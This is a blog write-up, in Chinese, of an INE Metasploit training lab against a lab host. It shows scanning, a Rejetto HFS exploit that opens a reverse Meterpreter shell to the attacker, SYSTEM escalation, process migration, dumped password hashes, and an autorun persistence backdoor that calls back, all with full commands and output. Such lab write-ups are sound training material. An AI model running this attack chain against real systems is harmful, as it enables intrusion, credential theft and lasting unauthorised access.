---
layout: post
title: "Metasploit Lab"
date: "2022-07-31"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Metasploit
## 概述
在本实验中，您将学习查找和利用易受攻击的应用程序。它还将涵盖提取敏感信息和维护访问权限的后利用技术！

## 任务
### 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。可以使用安装在 Kali 上的工具访问易受攻击的应用程序 `http://demo.ine.local` 

目标：执行以下活动：

1. 识别目标上的可用服务

2. 查找目标应用程序的漏洞

3. 使用 Metasploit 框架利用目标

4. 获取机器上的SYSTEM权限

5. 安装 Persistence 后门

6. 提取自动登录凭据

![demoinelocal.png](/img/in-post/ine/demoinelocal.png)

### 工具
该实验室的最佳工具是：

* Metasploit Framework

* Nmap

## 我自己的思路
Objective: Perform the following activities:

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 2105  bytes 180517 (176.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2328  bytes 2010497 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.21.2  netmask 255.255.255.0  broadcast 10.10.21.255
        ether 02:42:0a:0a:15:02  txqueuelen 0  (Ethernet)
        RX packets 13  bytes 1086 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4582  bytes 26371345 (25.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4582  bytes 26371345 (25.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

根据计算，eth0所在网段可用主机 IP 范围`10.1.0.1 - 10.1.255.254`，eth1所在网段可用主机 IP 范围`10.10.16.1 - 10.10.16.254`。

```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (10.0.20.141) 56(84) bytes of data.
64 bytes from demo.ine.local (10.0.20.141): icmp_seq=1 ttl=125 time=3.94 ms
64 bytes from demo.ine.local (10.0.20.141): icmp_seq=2 ttl=125 time=2.97 ms
64 bytes from demo.ine.local (10.0.20.141): icmp_seq=3 ttl=125 time=3.00 ms
64 bytes from demo.ine.local (10.0.20.141): icmp_seq=4 ttl=125 time=2.92 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 2.924/3.207/3.936/0.421 ms
```

而demo.ine.local的IP为`10.0.20.141`，似乎与eth0和eth1都不在同一个网段。

```
root@INE:~# nmap -p1-65535 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 08:44 IST
Nmap scan report for demo.ine.local (10.0.27.106)
Host is up (0.0032s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.03 seconds
```

```
root@INE:~# nmap -sV -p80,135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49672 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 08:48 IST
Nmap scan report for demo.ine.local (10.0.27.106)
Host is up (0.0034s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          HttpFileServer httpd 2.3
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds
```

![http-file-server-23.png](/img/in-post/ine/http-file-server-23.png)

* Identify available services on the target

目标上可用的服务有：http、msrpc、netbios-ssn、microsoft-ds、ms-wbt-server，猜测可能有文件上传，空会话漏洞。


* Find vulnerability of the target application

首先，从HttpFileServer httpd 2.3入手：

[Rejetto HttpFileServer Remote Command Execution](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)

```
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.21.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Payload的LHOST是eth1`10.10.21.2`，LPORT是`4444`。


```
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
```

运行`exploit`之后，需要等待vbs脚本执行：

```
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.2:4444 
[*] Using URL: http://0.0.0.0:8080/2nWqmymQH98Z
[*] Local IP: http://10.10.21.2:8080/2nWqmymQH98Z
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /2nWqmymQH98Z
[*] Sending stage (175174 bytes) to 10.0.20.141
[*] Meterpreter session 1 opened (10.10.21.2:4444 -> 10.0.20.141:49762 ) at 2022-07-30 22:14:21 +0530
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\UjRQFJQpkD.vbs' on the target

```

* Exploit the target using Metasploit Framework

检索系统信息：

```
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

打印网络配置：

```
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  4
============
Name         : AWS PV Network Device #0
Hardware MAC : 06:ea:6c:5a:e6:e6
MTU          : 9001
IPv4 Address : 10.0.22.152
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::a4e4:ebe2:b2a6:5f16
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

检查路由信息：

```
meterpreter > route

IPv4 network routes
===================

    Subnet           Netmask          Gateway      Metric  Interface
    ------           -------          -------      ------  ---------
    0.0.0.0          0.0.0.0          10.0.16.1    25      4
    10.0.16.0        255.255.240.0    10.0.22.152  281     4
    10.0.22.152      255.255.255.255  10.0.22.152  281     4
    10.0.31.255      255.255.255.255  10.0.22.152  281     4
    127.0.0.0        255.0.0.0        127.0.0.1    331     1
    127.0.0.1        255.255.255.255  127.0.0.1    331     1
    127.255.255.255  255.255.255.255  127.0.0.1    331     1
    169.254.169.123  255.255.255.255  10.0.16.1    50      4
    169.254.169.249  255.255.255.255  10.0.16.1    50      4
    169.254.169.250  255.255.255.255  10.0.16.1    50      4
    169.254.169.251  255.255.255.255  10.0.16.1    50      4
    169.254.169.253  255.255.255.255  10.0.16.1    50      4
    169.254.169.254  255.255.255.255  10.0.16.1    50      4
    224.0.0.0        240.0.0.0        127.0.0.1    331     1
    224.0.0.0        240.0.0.0        10.0.22.152  281     4
    255.255.255.255  255.255.255.255  127.0.0.1    331     1
    255.255.255.255  255.255.255.255  10.0.22.152  281     4

No IPv6 routes were found.

```

哪个用户正在运行msf利用的进程：

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

获取在目标上运行的进程列表，识别我们附加到的进程：

```
meterpreter > ps


Process List
============

 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                   x64   0
 88    4     Registry                 x64   0
 392   4     smss.exe                 x64   0
 476   764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 500   764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 552   544   csrss.exe                x64   0
 628   620   csrss.exe                x64   1
 648   544   wininit.exe              x64   0
 696   620   winlogon.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 764   648   services.exe             x64   0
 784   648   lsass.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 828   696   dwm.exe                  x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 888   764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 908   764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 928   648   fontdrvhost.exe          x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 936   696   fontdrvhost.exe          x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 1016  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1032  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1084  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1140  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1148  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1156  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1228  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1380  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1412  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1420  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1444  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1452  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1456  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1472  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1540  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1560  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1580  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1612  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1648  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1676  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1688  1676  CompatTelRunner.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.exe
 1696  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1704  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1732  908   TiWorker.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1450_none_56e6965b
                                                                                   991df4af\TiWorker.exe
 1736  764   msdtc.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 1768  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1776  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1820  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1840  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1908  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2036  1688  conhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2096  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2136  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2264  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2280  4840  cmd.exe                  x86   1        ATTACKDEFENSE\Administrator   C:\Windows\SysWOW64\cmd.exe
 2312  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2384  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2392  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2548  764   spoolsv.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2584  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2592  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2604  764   LiteAgent.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2656  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2696  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2704  2280  conhost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\conhost.exe
 2732  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2740  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2748  764   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2772  5092  wscript.exe              x86   1        ATTACKDEFENSE\Administrator   C:\Windows\SysWOW64\wscript.exe
 2796  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2824  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2860  764   amazon-ssm-agent.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 2868  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3044  1676  CompatTelRunner.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.exe
 3148  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3196  3044  conhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3228  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3432  4088  ctfmon.exe               x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\ctfmon.exe
 3440  1676  taskhostw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\taskhostw.exe
 3548  764   svchost.exe              x64   0
 3624  3588  explorer.exe             x64   1        ATTACKDEFENSE\Administrator   C:\Windows\explorer.exe
 3640  764   vds.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 3740  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3768  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3812  764   svchost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\svchost.exe
 3828  764   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3832  764   svchost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\svchost.exe
 3852  2136  sihost.exe               x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\sihost.exe
 3860  1676  taskhostw.exe            x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\taskhostw.exe
 3920  764   svchost.exe              x64   0
 3948  764   svchost.exe              x64   0
 4016  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4088  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4204  908   ShellExperienceHost.exe  x64   1        ATTACKDEFENSE\Administrator   C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4348  908   SearchUI.exe             x64   1        ATTACKDEFENSE\Administrator   C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 4388  908   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4528  908   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4840  2772  pqRUvDzUJLKglgO.exe      x86   1        ATTACKDEFENSE\Administrator   C:\Users\ADMINI~1\AppData\Local\Temp\1\rad1D665.tmp\pqRUvDzUJLKglgO.exe
 4852  908   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4924  764   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 5092  3624  hfs.exe                  x86   1        ATTACKDEFENSE\Administrator   C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
 5104  764   TrustedInstaller.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe


```

我们附加到哪个进程id上：

```
meterpreter > getpid                                                                                                                                                                        
Current pid: 4840
```

```
 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
4840  2772  pqRUvDzUJLKglgO.exe      x86   1        ATTACKDEFENSE\Administrator   C:\Users\ADMINI~1\AppData\Local\Temp\1\rad1D665.tmp\pqRUvDzUJLKglgO.exe
```

工作目录：

```
meterpreter > pwd
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

工作目录和存储后门的目录相同：

```
 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
5092  3624  hfs.exe                  x86   1        ATTACKDEFENSE\Administrator   C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe

```

* Obtain SYSTEM privileges on the machine

提权：

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

进程名字很可疑：`pqRUvDzUJLKglgO.exe`。

使用`migrate`命令将会话附加在不同的进程上，以达到隐蔽的目的。

选择和我们当前有相同权限的进程：`ps -U SYSTEM`

```
meterpreter > ps -U SYSTEM
Filtering on user 'SYSTEM'

Process List
============

 PID   PPID  Name                  Arch  Session  User                 Path
 ---   ----  ----                  ----  -------  ----                 ----
 476   764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 500   764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 696   620   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
 784   648   lsass.exe             x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
 888   764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 908   764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1084  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1140  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1420  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1444  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1472  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1580  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1676  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1688  1676  CompatTelRunner.exe   x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\CompatTelRunner.exe
 1776  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2036  1688  conhost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\conhost.exe
 2096  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2136  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2264  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2312  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2392  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2548  764   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\spoolsv.exe
 2592  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2604  764   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2656  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2696  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2740  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2796  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2824  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 2860  764   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 2868  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 3148  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 3640  764   vds.exe               x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\vds.exe
 3740  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 4016  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 4088  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 4924  764   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe


```

```
meterpreter > migrate 888
[*] Migrating from 4840 to 888...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 888
```

* Install Persistence backdoor

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ced90e129a71b2429865724a9c949c0a:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

参考：[JOHN THE RIPPER](https://www.offensive-security.com/metasploit-unleashed/john-ripper/#:~:text=The%20John%20The%20Ripper%20module,a%20short%20amount%20of%20time.)

[PERSISTENT BACKDOORS](https://www.offensive-security.com/metasploit-unleashed/persistent-backdoors/)

[METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)


```
meterpreter > run persistence -h

[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:

    -A        Automatically start a matching exploit/multi/handler to connect to the agent
    -h        This help menu
    -i <opt>  The interval in seconds between each connection attempt
    -L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
    -p <opt>  The port on which the system running Metasploit is listening
    -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
    -r <opt>  The IP of the system running Metasploit listening for the connect back
    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T <opt>  Alternate executable template to use
    -U        Automatically start the agent when the User logs on
    -X        Automatically start the agent when the system boots
```

配置我们的持久性 Meterpreter 会话，等待系统启动，并尝试每 5 秒在端口 443 上的 IP 地址 10.10.21.2 连接回我们的侦听器。

```
meterpreter > run persistence -X -i 5 -p 443 -r 10.10.21.2

[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/ATTACKDEFENSE_20220730.3115/ATTACKDEFENSE_20220730.3115.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.10.21.2 LPORT=443
[*] Persistent agent script is 99669 bytes long
[+] Persistent Script written to C:\Windows\TEMP\MLALkzB.vbs
[*] Executing script C:\Windows\TEMP\MLALkzB.vbs
[+] Agent executed with PID 4980
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\GxEPIJECTKH
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\GxEPIJECTKH

```

为了验证它是否有效，我们重新启动远程系统并设置我们的有效负载处理程序。

```
meterpreter > reboot
Rebooting...
meterpreter > 
[*] 10.0.20.141 - Meterpreter session 1 closed.  Reason: Died

msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.21.2
LHOST => 10.10.21.2
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.21.2:443 
[*] Sending stage (175174 bytes) to 10.0.20.141
[*] Meterpreter session 2 opened (10.10.21.2:443 -> 10.0.20.141:49700 ) at 2022-07-30 22:50:41 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 

```

* Extract AutoLogin credentials

